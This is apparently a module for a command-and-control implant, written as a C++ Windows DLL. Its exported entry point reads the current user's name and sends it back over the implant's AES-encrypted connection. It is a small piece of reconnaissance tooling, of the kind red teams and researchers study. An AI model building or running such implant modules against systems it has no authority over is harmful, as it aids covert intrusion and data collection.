#include <Windows.h>
#include <lmcons.h>
#include <structs.h>

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	char username[UNLEN + 1];
	DWORD len = UNLEN + 1;
	GetUserNameA(username, &len);
	USERNAME response = { 0 };
	response.username_length = strlen(username);
	memcpy(response.username, username, strlen(username));
	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
	return 0;
}